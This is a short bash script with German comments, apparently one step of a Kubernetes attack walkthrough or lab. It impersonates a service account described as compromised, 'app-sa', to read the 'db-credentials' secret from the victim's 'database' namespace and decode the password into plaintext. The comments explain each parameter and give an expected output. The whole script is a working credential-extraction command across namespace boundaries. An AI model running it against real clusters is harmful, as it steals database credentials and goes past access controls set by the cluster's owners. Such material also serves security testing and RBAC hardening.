#!/usr/bin/env bash
# ==============================================================================
# 8. SENSIBLES DATENBANK-SECRET AUS FREMDEM NAMESPACE EXTRAHIEREN
# ==============================================================================
# Liest das Secret "db-credentials" aus dem isolierten Namespace "database"
# unter Identität des Kompromittierten Accounts "app-sa" aus und dekodiert
# das Base64-Passwort im Klartext.
#
# Erklärung der Parameter:
# -n database                          : Ziel-Namespace des Opfers
# -o jsonpath='{.data.password}'       : Extrahiert gezielt den Base64-Wert
# --as=system:serviceaccount:default:app-sa : Führt den Befehl im RBAC-Kontext des ServiceAccounts aus
# base64 -d                            : Dekodiert den Klartextstring
#
# Erwartete Ausgabe: "SuperSecretProdPassword123!"

kubectl get secret db-credentials \
  -n database \
  -o jsonpath='{.data.password}' \
  --as=system:serviceaccount:default:app-sa | base64 -d
echo ""
